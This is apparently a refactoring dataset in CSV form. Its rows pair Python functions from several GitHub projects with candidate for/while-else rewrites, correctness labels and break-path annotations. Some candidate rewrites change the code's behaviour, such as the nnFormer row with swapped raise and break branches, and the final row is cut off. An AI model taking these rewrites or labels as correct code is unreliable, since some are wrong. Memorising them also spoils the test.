Senta,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Senta/senta/data/tokenizer/tokenization_wp.py,https://github.com/baidu/Senta/tree/master/senta/data/tokenizer/tokenization_wp.py,SentencePieceTokenizer,tokenize$316,"def tokenize(self, text):
        """"""
        :param text:
        :return:
        """"""
        text = convert_to_unicode(text)
        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue
            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start == 0:
                        substr = u'\u2581' + substr
                    if substr in self.vocabulary.vocab_dict:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start == 0:
            substr = u'▁' + substr
        if substr in self.vocabulary.vocab_dict:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start == 0:
            substr = u'▁' + substr
        if substr in self.vocabulary.vocab_dict:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start == 0:
            substr = u'▁' + substr
        if substr in self.vocabulary.vocab_dict:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start == 0:
            substr = u'▁' + substr
        if substr in self.vocabulary.vocab_dict:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
Senta,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Senta/senta/data/tokenizer/tokenization_wp.py,https://github.com/baidu/Senta/tree/master/senta/data/tokenizer/tokenization_wp.py,SentencePieceTokenizer,tokenize$316,"def tokenize(self, text):
        """"""
        :param text:
        :return:
        """"""
        text = convert_to_unicode(text)
        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue
            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start == 0:
                        substr = u'\u2581' + substr
                    if substr in self.vocabulary.vocab_dict:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start == 0:
        substr = u'▁' + substr
    if substr in self.vocabulary.vocab_dict:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start == 0:
        substr = u'▁' + substr
    if substr in self.vocabulary.vocab_dict:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start == 0:
        substr = u'▁' + substr
    if substr in self.vocabulary.vocab_dict:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
coa_tools,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/coa_tools/Blender/coa_tools/addon_updater.py,https://github.com/ndee85/coa_tools/tree/master/Blender/coa_tools/addon_updater.py,Singleton_updater,deepMergeDirectory$797,"def deepMergeDirectory(self,base,merger,clean=False):
        if not os.path.exists(base):
            if self._verbose: print(""Base path does not exist"")
            return -1
        elif not os.path.exists(merger):
            if self._verbose: print(""Merger path does not exist"")
            return -1

        # paths to be aware of and not overwrite/remove/etc
        staging_path = os.path.join(self._updater_path,""update_staging"")
        backup_path = os.path.join(self._updater_path,""backup"")
        json_path = os.path.join(self._updater_path,""updater_status.json"")

        # If clean install is enabled, clear existing files ahead of time
        # note: will not delete the update.json, update folder, staging, or staging
        # but will delete all other folders/files in addon directory
        error = None
        if clean==True:
            try:
                # implement clearing of all folders/files, except the
                # updater folder and updater json
                # Careful, this deletes entire subdirectories recursively...
                # make sure that base is not a high level shared folder, but
                # is dedicated just to the addon itself
                if self._verbose: print(""clean=True, clearing addon folder to fresh install state"")

                # remove root files and folders (except update folder)
                files = [f for f in os.listdir(base) if os.path.isfile(os.path.join(base,f))]
                folders = [f for f in os.listdir(base) if os.path.isdir(os.path.join(base,f))]

                for f in files:
                    os.remove(os.path.join(base,f))
                    print(""Clean removing file {}"".format(os.path.join(base,f)))
                for f in folders:
                    if os.path.join(base,f)==self._updater_path: continue
                    shutil.rmtree(os.path.join(base,f))
                    print(""Clean removing folder and contents {}"".format(os.path.join(base,f)))

            except error:
                error = ""failed to create clean existing addon folder""
                print(error,str(e))

        # Walk through the base addon folder for rules on pre-removing
        # but avoid removing/altering backup and updater file
        for path, dirs, files in os.walk(base):
            # prune ie skip updater folder
            dirs[:] = [d for d in dirs if os.path.join(path,d) not in [self._updater_path]]
            for file in files:
                for ptrn in self.remove_pre_update_patterns:
                    if fnmatch.filter([file],ptrn):
                        try:
                            fl = os.path.join(path,file)
                            os.remove(fl)
                            if self._verbose: print(""Pre-removed file ""+file)
                        except OSError:
                            print(""Failed to pre-remove ""+file)

        # Walk through the temp addon sub folder for replacements
        # this implements the overwrite rules, which apply after
        # the above pre-removal rules. This also performs the
        # actual file copying/replacements
        for path, dirs, files in os.walk(merger):
            # verify this structure works to prune updater sub folder overwriting
            dirs[:] = [d for d in dirs if os.path.join(path,d) not in [self._updater_path]]
            relPath = os.path.relpath(path, merger)
            destPath = os.path.join(base, relPath)
            if not os.path.exists(destPath):
                os.makedirs(destPath)
            for file in files:
                # bring in additional logic around copying/replacing
                # Blender default: overwrite .py's, don't overwrite the rest
                destFile = os.path.join(destPath, file)
                srcFile = os.path.join(path, file)

                # decide whether to replace if file already exists, and copy new over
                if os.path.isfile(destFile):
                    # otherwise, check each file to see if matches an overwrite pattern
                    replaced=False
                    for ptrn in self._overwrite_patterns:
                        if fnmatch.filter([destFile],ptrn):
                            replaced=True
                            break
                    if replaced:
                        os.remove(destFile)
                        os.rename(srcFile, destFile)
                        if self._verbose: print(""Overwrote file ""+os.path.basename(destFile))
                    else:
                        if self._verbose: print(""Pattern not matched to ""+os.path.basename(destFile)+"", not overwritten"")
                else:
                    # file did not previously exist, simply move it over
                    os.rename(srcFile, destFile)
                    if self._verbose: print(""New file ""+os.path.basename(destFile))

        # now remove the temp staging folder and downloaded zip
        try:
            shutil.rmtree(staging_path)
        except:
            error = ""Error: Failed to remove existing staging directory, consider manually removing ""+staging_path
            if self._verbose: print(error)","for ptrn in self._overwrite_patterns:
    if fnmatch.filter([destFile], ptrn):
        replaced = True
        break
if replaced:
    os.remove(destFile)
    os.rename(srcFile, destFile)
    if self._verbose:
        print('Overwrote file ' + os.path.basename(destFile))
elif self._verbose:
    print('Pattern not matched to ' + os.path.basename(destFile) + ', not overwritten')","for ptrn in self._overwrite_patterns:
    if fnmatch.filter([destFile], ptrn):
        os.remove(destFile)
        os.rename(srcFile, destFile)
        if self._verbose:
            print('Overwrote file ' + os.path.basename(destFile))
        break
else:
    if self._verbose:
        print('Pattern not matched to ' + os.path.basename(destFile) + ', not overwritten')","for ptrn in self._overwrite_patterns:
    if fnmatch.filter([destFile], ptrn):
        os.remove(destFile)
        os.rename(srcFile, destFile)
        if self._verbose:
            print('Overwrote file ' + os.path.basename(destFile))
        break
else:
    if self._verbose:
        print('Pattern not matched to ' + os.path.basename(destFile) + ', not overwritten')",1,"for ptrn in self._overwrite_patterns:
    if fnmatch.filter([destFile], ptrn):
        replaced = True
        break
if replaced:
    os.remove(destFile)
    os.rename(srcFile, destFile)
    if self._verbose:
        print('Overwrote file ' + os.path.basename(destFile))
elif self._verbose:
    print('Pattern not matched to ' + os.path.basename(destFile) + ', not overwritten')","break statement is executed:zejun1
break statement is not executed:None"
blueman,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/blueman/blueman/plugins/applet/NetUsage.py,https://github.com/blueman-project/blueman/tree/master/blueman/plugins/applet/NetUsage.py,Dialog,__init__$103,"def __init__(self, plugin: ""NetUsage""):
        if not Dialog.running:
            Dialog.running = True
        else:
            return
        self.plugin = plugin
        builder = Builder(""net-usage.ui"")

        self.dialog = builder.get_widget(""dialog"", Gtk.Dialog)
        self.dialog.connect(""response"", self.on_response)
        cr1 = Gtk.CellRendererText()
        cr1.props.ellipsize = Pango.EllipsizeMode.END

        self._handlerids: List[int] = []
        self._handlerids.append(plugin.connect(""monitor-added"", self.monitor_added))
        self._handlerids.append(plugin.connect(""monitor-removed"", self.monitor_removed))
        self._handlerids.append(plugin.connect(""stats"", self.on_stats))

        cr2 = Gtk.CellRendererText()
        cr2.props.sensitive = False
        cr2.props.style = Pango.Style.ITALIC

        self.liststore = Gtk.ListStore(str, str, str, object)

        self.e_ul = builder.get_widget(""e_ul"", Gtk.Entry)
        self.e_dl = builder.get_widget(""e_dl"", Gtk.Entry)
        self.e_total = builder.get_widget(""e_total"", Gtk.Entry)

        self.l_started = builder.get_widget(""l_started"", Gtk.Label)
        self.l_duration = builder.get_widget(""l_duration"", Gtk.Label)

        self.b_reset = builder.get_widget(""b_reset"", Gtk.Button)
        self.b_reset.connect(""clicked"", self.on_reset)

        self.cb_device = builder.get_widget(""cb_device"", Gtk.ComboBox)
        self.cb_device.props.model = self.liststore
        self.cb_device.connect(""changed"", self.on_selection_changed)

        self.cb_device.pack_start(cr1, True)
        self.cb_device.add_attribute(cr1, 'markup', 1)

        self.cb_device.pack_start(cr2, False)
        self.cb_device.add_attribute(cr2, 'markup', 2)

        general_config = Gio.Settings(schema_id=""org.blueman.general"")

        added = False
        for d in general_config[""netusage-dev-list""]:
            for m in plugin.monitors:
                if d == m.device[""Address""]:
                    titer = self.liststore.append(
                        [d, self.get_caption(m.device.display_name, m.device[""Address""]),
                         _(""Connected:"") + "" "" + m.interface, m])
                    if self.cb_device.get_active() == -1:
                        self.cb_device.set_active_iter(titer)
                    added = True
                    break
            if not added:
                name = d
                if self.plugin.parent.Manager:
                    device = self.plugin.parent.Manager.find_device(d)
                    if device is None:
                        pass
                    else:
                        name = self.get_caption(device.display_name, device[""Address""])

                self.liststore.append([d, name, _(""Not Connected""), None])
            added = False
        if len(self.liststore) > 0:
            if self.cb_device.get_active() == -1:
                self.cb_device.set_active(0)
        else:
            msg = _(""No usage statistics are available yet. Try establishing a connection first and ""
                    ""then check this page."")
            d = Gtk.MessageDialog(parent=self.dialog, modal=True, type=Gtk.MessageType.INFO,
                                  buttons=Gtk.ButtonsType.CLOSE, text=msg)
            d.props.icon_name = ""blueman""
            d.run()
            d.destroy()
            self.on_response(None, None)
            return

        self.dialog.show()","for m in plugin.monitors:
    if d == m.device['Address']:
        titer = self.liststore.append([d, self.get_caption(m.device.display_name, m.device['Address']), _('Connected:') + ' ' + m.interface, m])
        if self.cb_device.get_active() == -1:
            self.cb_device.set_active_iter(titer)
        added = True
        break
if not added:
    name = d
    if self.plugin.parent.Manager:
        device = self.plugin.parent.Manager.find_device(d)
        if device is None:
            pass
        else:
            name = self.get_caption(device.display_name, device['Address'])
    self.liststore.append([d, name, _('Not Connected'), None])","for m in plugin.monitors:
    if d == m.device['Address']:
        titer = self.liststore.append([d, self.get_caption(m.device.display_name, m.device['Address']), _('Connected:') + ' ' + m.interface, m])
        if self.cb_device.get_active() == -1:
            self.cb_device.set_active_iter(titer)
        added = True
        break
else:
    name = d
    if self.plugin.parent.Manager:
        device = self.plugin.parent.Manager.find_device(d)
        if device is None:
            pass
        else:
            name = self.get_caption(device.display_name, device['Address'])
    self.liststore.append([d, name, _('Not Connected'), None])","for m in plugin.monitors:
    if d == m.device['Address']:
        titer = self.liststore.append([d, self.get_caption(m.device.display_name, m.device['Address']), _('Connected:') + ' ' + m.interface, m])
        if self.cb_device.get_active() == -1:
            self.cb_device.set_active_iter(titer)
        added = True
        break
else:
    name = d
    if self.plugin.parent.Manager:
        device = self.plugin.parent.Manager.find_device(d)
        if device is None:
            pass
        else:
            name = self.get_caption(device.display_name, device['Address'])
    self.liststore.append([d, name, _('Not Connected'), None])",1,"for m in plugin.monitors:
    if d == m.device['Address']:
        titer = self.liststore.append([d, self.get_caption(m.device.display_name, m.device['Address']), _('Connected:') + ' ' + m.interface, m])
        if self.cb_device.get_active() == -1:
            self.cb_device.set_active_iter(titer)
        added = True
        break
if not added:
    name = d
    if self.plugin.parent.Manager:
        device = self.plugin.parent.Manager.find_device(d)
        if device is None:
            pass
        else:
            name = self.get_caption(device.display_name, device['Address'])
    self.liststore.append([d, name, _('Not Connected'), None])","break statement is executed:None
break statement is not executed:zejun1"
PSPTool,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/PSPTool/psptool/blob.py,https://github.com/PSPReverse/PSPTool/tree/master/psptool/blob.py,Blob,__init__$35,"def __init__(self, buffer: bytearray, size: int, psptool):
        super().__init__(buffer, size)

        self.psptool = psptool
        self.roms: List[Rom] = []

        potential_fet_offsets = [
            # as seen by a PSPTrace Zen 1 boot
            0x020000,
            0xfa0000,
            0xf20000,
            0xe20000,
            0xc20000,
            0x820000,
        ]

        rom_size = 0x1000000
        if self.buffer_size < rom_size:
            self.psptool.ph.print_warning(""Input  file < 16M, will assume 8M ROM ..."")
            rom_size = 0x800000

        # For each FET, we try to create a 16MB ROM starting at `FET - offset`
        for fet_location in self._find_fets():
            fet_parsed = False
            for fet_offset in potential_fet_offsets:
                if fet_location < fet_offset:
                    # would lead to Blob underflow
                    continue
                if fet_location - fet_offset + rom_size > self.buffer_size:
                    # would lead to Blob overflow
                    continue
                try:
                    rom_offset = fet_location - fet_offset  # e.g. 0x20800 - 0x20000 = 0x0800
                    potential_rom = Rom(self, rom_size, rom_offset, fet_offset, psptool)
                    self.roms.append(potential_rom)
                    fet_parsed = True
                    break  # found correct fet_offset!
                except EmptyFet:
                    self.psptool.ph.print_warning(f""Empty FET at offset {hex(fet_offset)}, trying next offset"")
                    continue
            if not fet_parsed:
                self.psptool.ph.print_warning(f""Skipping FET at {hex(fet_location)} due to unknown ROM alignment"")

        self._construct_range_dict()","for fet_offset in potential_fet_offsets:
    if fet_location < fet_offset:
        continue
    if fet_location - fet_offset + rom_size > self.buffer_size:
        continue
    try:
        rom_offset = fet_location - fet_offset
        potential_rom = Rom(self, rom_size, rom_offset, fet_offset, psptool)
        self.roms.append(potential_rom)
        fet_parsed = True
        break
    except EmptyFet:
        self.psptool.ph.print_warning(f'Empty FET at offset {hex(fet_offset)}, trying next offset')
        continue
if not fet_parsed:
    self.psptool.ph.print_warning(f'Skipping FET at {hex(fet_location)} due to unknown ROM alignment')","for fet_offset in potential_fet_offsets:
    if fet_location < fet_offset:
        continue
    if fet_location - fet_offset + rom_size > self.buffer_size:
        continue
    try:
        rom_offset = fet_location - fet_offset
        potential_rom = Rom(self, rom_size, rom_offset, fet_offset, psptool)
        self.roms.append(potential_rom)
        break
    except EmptyFet:
        self.psptool.ph.print_warning(f'Empty FET at offset {hex(fet_offset)}, trying next offset')
        continue
else:
    self.psptool.ph.print_warning(f'Skipping FET at {hex(fet_location)} due to unknown ROM alignment')","for fet_offset in potential_fet_offsets:
    if fet_location < fet_offset:
        continue
    if fet_location - fet_offset + rom_size > self.buffer_size:
        continue
    try:
        rom_offset = fet_location - fet_offset
        potential_rom = Rom(self, rom_size, rom_offset, fet_offset, psptool)
        self.roms.append(potential_rom)
        break
    except EmptyFet:
        self.psptool.ph.print_warning(f'Empty FET at offset {hex(fet_offset)}, trying next offset')
        continue
else:
    self.psptool.ph.print_warning(f'Skipping FET at {hex(fet_location)} due to unknown ROM alignment')",1,"for fet_offset in potential_fet_offsets:
    if fet_location < fet_offset:
        continue
    if fet_location - fet_offset + rom_size > self.buffer_size:
        continue
    try:
        rom_offset = fet_location - fet_offset
        potential_rom = Rom(self, rom_size, rom_offset, fet_offset, psptool)
        self.roms.append(potential_rom)
        fet_parsed = True
        break
    except EmptyFet:
        self.psptool.ph.print_warning(f'Empty FET at offset {hex(fet_offset)}, trying next offset')
        continue
if not fet_parsed:
    self.psptool.ph.print_warning(f'Skipping FET at {hex(fet_location)} due to unknown ROM alignment')","break statement is executed:None
break statement is not executed:zejun1"
PaddleSeg,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/PaddleSeg/contrib/PanopticDeepLab/utils/evaluation/instance.py,https://github.com/PaddlePaddle/PaddleSeg/tree/master/contrib/PanopticDeepLab/utils/evaluation/instance.py,InstanceEvaluator,update$68,"def update(self, preds, gts, ignore_mask=None):
        """"""
        compute y_true and y_score in this image.
        preds (list): tuple list [(label, confidence, mask), ...].
        gts (list): tuple list [(label, mask), ...].
        ignore_mask (np.ndarray): Mask to ignore.
        """"""

        pred_instances, gt_instances = self.get_instances(
            preds, gts, ignore_mask=ignore_mask)

        for i in range(self.num_classes):
            if i not in self.thing_list:
                continue
            for oi, oth in enumerate(self.overlaps):
                cur_true = np.ones((len(gt_instances[i])))
                cur_score = np.ones(len(gt_instances[i])) * (-float(""inf""))
                cur_match = np.zeros(len(gt_instances[i]), dtype=np.bool)
                for gti, gt_instance in enumerate(gt_instances[i]):
                    found_match = False
                    for pred_instance in gt_instance['matched_pred']:
                        overlap = float(pred_instance['intersection']) / (
                            gt_instance['pixel_count'] + pred_instance[
                                'pixel_count'] - pred_instance['intersection'])
                        if overlap > oth:
                            confidence = pred_instance['confidence']

                            # if we already has a prediction for this groundtruth
                            # the prediction with the lower score is automatically a false positive
                            if cur_match[gti]:
                                max_score = max(cur_score[gti], confidence)
                                min_score = min(cur_score[gti], confidence)
                                cur_score = max_score
                                # append false positive
                                cur_true = np.append(cur_true, 0)
                                cur_score = np.append(cur_score, min_score)
                                cur_match = np.append(cur_match, True)
                            # otherwise set score
                            else:
                                found_match = True
                                cur_match[gti] = True
                                cur_score[gti] = confidence

                    if not found_match:
                        self.hard_fns[i][oi] += 1
                # remove not-matched ground truth instances
                cur_true = cur_true[cur_match == True]
                cur_score = cur_score[cur_match == True]

                # collect not-matched predictions as false positive
                for pred_instance in pred_instances[i]:
                    found_gt = False
                    for gt_instance in pred_instance['matched_gt']:
                        overlap = float(gt_instance['intersection']) / (
                            gt_instance['pixel_count'] + pred_instance[
                                'pixel_count'] - gt_instance['intersection'])
                        if overlap > oth:
                            found_gt = True
                            break
                    if not found_gt:
                        proportion_ignore = 0
                        if ignore_mask is not None:
                            nb_ignore_pixels = pred_instance[
                                'void_intersection']
                            proportion_ignore = float(
                                nb_ignore_pixels) / pred_instance['pixel_count']
                        if proportion_ignore <= oth:
                            cur_true = np.append(cur_true, 0)
                            cur_score = np.append(cur_score,
                                                  pred_instance['confidence'])
                self.y_true[i][oi] = np.append(self.y_true[i][oi], cur_true)
                self.y_score[i][oi] = np.append(self.y_score[i][oi], cur_score)","for gt_instance in pred_instance['matched_gt']:
    overlap = float(gt_instance['intersection']) / (gt_instance['pixel_count'] + pred_instance['pixel_count'] - gt_instance['intersection'])
    if overlap > oth:
        found_gt = True
        break
if not found_gt:
    proportion_ignore = 0
    if ignore_mask is not None:
        nb_ignore_pixels = pred_instance['void_intersection']
        proportion_ignore = float(nb_ignore_pixels) / pred_instance['pixel_count']
    if proportion_ignore <= oth:
        cur_true = np.append(cur_true, 0)
        cur_score = np.append(cur_score, pred_instance['confidence'])","for gt_instance in pred_instance['matched_gt']:
    overlap = float(gt_instance['intersection']) / (gt_instance['pixel_count'] + pred_instance['pixel_count'] - gt_instance['intersection'])
    if overlap > oth:
        break
else:
    proportion_ignore = 0
    if ignore_mask is not None:
        nb_ignore_pixels = pred_instance['void_intersection']
        proportion_ignore = float(nb_ignore_pixels) / pred_instance['pixel_count']
    if proportion_ignore <= oth:
        cur_true = np.append(cur_true, 0)
        cur_score = np.append(cur_score, pred_instance['confidence'])","for gt_instance in pred_instance['matched_gt']:
    overlap = float(gt_instance['intersection']) / (gt_instance['pixel_count'] + pred_instance['pixel_count'] - gt_instance['intersection'])
    if overlap > oth:
        break
else:
    proportion_ignore = 0
    if ignore_mask is not None:
        nb_ignore_pixels = pred_instance['void_intersection']
        proportion_ignore = float(nb_ignore_pixels) / pred_instance['pixel_count']
    if proportion_ignore <= oth:
        cur_true = np.append(cur_true, 0)
        cur_score = np.append(cur_score, pred_instance['confidence'])",1,"for gt_instance in pred_instance['matched_gt']:
    overlap = float(gt_instance['intersection']) / (gt_instance['pixel_count'] + pred_instance['pixel_count'] - gt_instance['intersection'])
    if overlap > oth:
        found_gt = True
        break
if not found_gt:
    proportion_ignore = 0
    if ignore_mask is not None:
        nb_ignore_pixels = pred_instance['void_intersection']
        proportion_ignore = float(nb_ignore_pixels) / pred_instance['pixel_count']
    if proportion_ignore <= oth:
        cur_true = np.append(cur_true, 0)
        cur_score = np.append(cur_score, pred_instance['confidence'])","break statement is executed:None
break statement is not executed:zejun1"
homeassistant-config,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/homeassistant-config/custom_components/aarlo/pyaarlo/backend.py,https://github.com/arsaboo/homeassistant-config/tree/master/custom_components/aarlo/pyaarlo/backend.py,ArloBackEnd,_auth$438,"def _auth(self):
        headers = {
            ""Auth-Version"": ""2"",
            ""Accept"": ""application/json, text/plain, */*"",
            ""Referer"": self._arlo.cfg.host,
            ""User-Agent"": self._user_agent,
            ""Source"": ""arloCamWeb"",
        }

        # Handle 1015 error
        attempt = 0
        body = None
        while attempt < 3:
            attempt += 1
            self._arlo.debug(""login attempt #{}"".format(attempt))
            body = self.auth_post(
                AUTH_PATH,
                {
                    ""email"": self._arlo.cfg.username,
                    ""password"": to_b64(self._arlo.cfg.password),
                    ""language"": ""en"",
                    ""EnvSource"": ""prod"",
                },
                headers,
            )
            if body is not None:
                break
            time.sleep(1)
        if body is None:
            self._arlo.error(""authentication failed"")
            return False

        # save new login information
        self._update_auth_info(body)

        # Looks like we need 2FA. So, request a code be sent to our email address.
        if not body[""authCompleted""]:
            self._arlo.debug(""need 2FA..."")

            # update headers and create 2fa instance
            headers[""Authorization""] = self._token64
            tfa = self._get_tfa()

            # get available 2fa choices,
            self._arlo.debug(""getting tfa choices"")
            factors = self.auth_get(
                AUTH_GET_FACTORS + ""?data = {}"".format(int(time.time())), {}, headers
            )
            if factors is None:
                self._arlo.error(""2fa: no secondary choices available"")
                return False

            # look for code source choice
            self._arlo.debug(""looking for {}"".format(self._arlo.cfg.tfa_type))
            factor_id = None
            for factor in factors[""items""]:
                if factor[""factorType""].lower() == self._arlo.cfg.tfa_type:
                    factor_id = factor[""factorId""]
            if factor_id is None:
                self._arlo.error(""2fa no suitable secondary choice available"")
                return False

            # snapshot 2fa before sending in request
            if not tfa.start():
                self._arlo.error(""2fa startup failed"")
                return False

            # start authentication with email
            self._arlo.debug(""starting auth with {}"".format(self._arlo.cfg.tfa_type))
            body = self.auth_post(AUTH_START_PATH, {""factorId"": factor_id}, headers)
            if body is None:
                self._arlo.error(""2fa startAuth failed"")
                return False
            factor_auth_code = body[""factorAuthCode""]

            # get code from TFA source
            code = tfa.get()
            if code is None:
                self._arlo.error(""2fa core retrieval failed"")
                return False

            # tidy 2fa
            tfa.stop()

            # finish authentication
            self._arlo.debug(""finishing auth"")
            body = self.auth_post(
                AUTH_FINISH_PATH,
                {""factorAuthCode"": factor_auth_code, ""otp"": code},
                headers,
            )
            if body is None:
                self._arlo.error(""2fa finishAuth failed"")
                return False

            # save new login information
            self._update_auth_info(body)

        return True","while attempt < 3:
    attempt += 1
    self._arlo.debug('login attempt #{}'.format(attempt))
    body = self.auth_post(AUTH_PATH, {'email': self._arlo.cfg.username, 'password': to_b64(self._arlo.cfg.password), 'language': 'en', 'EnvSource': 'prod'}, headers)
    if body is not None:
        break
    time.sleep(1)
if body is None:
    self._arlo.error('authentication failed')
    return False","while attempt < 3:
    attempt += 1
    self._arlo.debug('login attempt #{}'.format(attempt))
    body = self.auth_post(AUTH_PATH, {'email': self._arlo.cfg.username, 'password': to_b64(self._arlo.cfg.password), 'language': 'en', 'EnvSource': 'prod'}, headers)
    if body is not None:
        break
    time.sleep(1)
else:
    self._arlo.error('authentication failed')
    return False","while attempt < 3:
    attempt += 1
    self._arlo.debug('login attempt #{}'.format(attempt))
    body = self.auth_post(AUTH_PATH, {'email': self._arlo.cfg.username, 'password': to_b64(self._arlo.cfg.password), 'language': 'en', 'EnvSource': 'prod'}, headers)
    if body is not None:
        break
    time.sleep(1)
else:
    self._arlo.error('authentication failed')
    return False",1,"while attempt < 3:
    attempt += 1
    self._arlo.debug('login attempt #{}'.format(attempt))
    body = self.auth_post(AUTH_PATH, {'email': self._arlo.cfg.username, 'password': to_b64(self._arlo.cfg.password), 'language': 'en', 'EnvSource': 'prod'}, headers)
    if body is not None:
        break
    time.sleep(1)
if body is None:
    self._arlo.error('authentication failed')
    return False","break statement is executed:None
break statement is not executed:zejun1"
nnFormer,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nnFormer/nnformer/run/load_pretrained_weights.py,https://github.com/282857341/nnFormer/tree/master/nnformer/run/load_pretrained_weights.py,,load_pretrained_weights$17,"def load_pretrained_weights(network, fname, verbose=False):
    """"""
    THIS DOES NOT TRANSFER SEGMENTATION HEADS!
    """"""
    saved_model = torch.load(fname)
    pretrained_dict = saved_model['state_dict']

    new_state_dict = {}

    # if state dict comes form nn.DataParallel but we use non-parallel model here then the state dict keys do not
    # match. Use heuristic to make it match
    for k, value in pretrained_dict.items():
        key = k
        # remove module. prefix from DDP models
        if key.startswith('module.'):
            key = key[7:]
        new_state_dict[key] = value

    pretrained_dict = new_state_dict

    model_dict = network.state_dict()
    ok = True
    for key, _ in model_dict.items():
        if ('conv_blocks' in key):
            if (key in pretrained_dict) and (model_dict[key].shape == pretrained_dict[key].shape):
                continue
            else:
                ok = False
                break

    # filter unnecessary keys
    if ok:
        pretrained_dict = {k: v for k, v in pretrained_dict.items() if
                           (k in model_dict) and (model_dict[k].shape == pretrained_dict[k].shape)}
        # 2. overwrite entries in the existing state dict
        model_dict.update(pretrained_dict)
        print(""################### Loading pretrained weights from file "", fname, '###################')
        if verbose:
            print(""Below is the list of overlapping blocks in pretrained model and nnFormer architecture:"")
            for key, _ in pretrained_dict.items():
                print(key)
        print(""################### Done ###################"")
        network.load_state_dict(model_dict)
    else:
        raise RuntimeError(""Pretrained weights are not compatible with the current network architecture"")","for (key, _) in model_dict.items():
    if 'conv_blocks' in key:
        if key in pretrained_dict and model_dict[key].shape == pretrained_dict[key].shape:
            continue
        else:
            ok = False
            break
if ok:
    pretrained_dict = {k: v for (k, v) in pretrained_dict.items() if k in model_dict and model_dict[k].shape == pretrained_dict[k].shape}
    model_dict.update(pretrained_dict)
    print('################### Loading pretrained weights from file ', fname, '###################')
    if verbose:
        print('Below is the list of overlapping blocks in pretrained model and nnFormer architecture:')
        for (key, _) in pretrained_dict.items():
            print(key)
    print('################### Done ###################')
    network.load_state_dict(model_dict)
else:
    raise RuntimeError('Pretrained weights are not compatible with the current network architecture')","for (key, _) in model_dict.items():
    if 'conv_blocks' in key:
        if key in pretrained_dict and model_dict[key].shape == pretrained_dict[key].shape:
            continue
        else:
            raise RuntimeError('Pretrained weights are not compatible with the current network architecture')
            break
else:
    pretrained_dict = {k: v for (k, v) in pretrained_dict.items() if k in model_dict and model_dict[k].shape == pretrained_dict[k].shape}
    model_dict.update(pretrained_dict)
    print('################### Loading pretrained weights from file ', fname, '###################')
    if verbose:
        print('Below is the list of overlapping blocks in pretrained model and nnFormer architecture:')
        for (key, _) in pretrained_dict.items():
            print(key)
    print('################### Done ###################')
    network.load_state_dict(model_dict)","for (key, _) in model_dict.items():
    if 'conv_blocks' in key:
        if key in pretrained_dict and model_dict[key].shape == pretrained_dict[key].shape:
            raise RuntimeError('Pretrained weights are not compatible with the current network architecture')
            continue
        else:
            break
else:
    pretrained_dict = {k: v for (k, v) in pretrained_dict.items() if k in model_dict and model_dict[k].shape == pretrained_dict[k].shape}
    model_dict.update(pretrained_dict)
    print('################### Loading pretrained weights from file ', fname, '###################')
    if verbose:
        print('Below is the list of overlapping blocks in pretrained model and nnFormer architecture:')
        for (key, _) in pretrained_dict.items():
            print(key)
    print('################### Done ###################')
    network.load_state_dict(model_dict)",0,"for (key, _) in model_dict.items():
    if 'conv_blocks' in key:
        if key in pretrained_dict and model_dict[key].shape == pretrained_dict[key].shape:
            continue
        else:
            ok = False
            break
if ok:
    pretrained_dict = {k: v for (k, v) in pretrained_dict.items() if k in model_dict and model_dict[k].shape == pretrained_dict[k].shape}
    model_dict.update(pretrained_dict)
    print('################### Loading pretrained weights from file ', fname, '###################')
    if verbose:
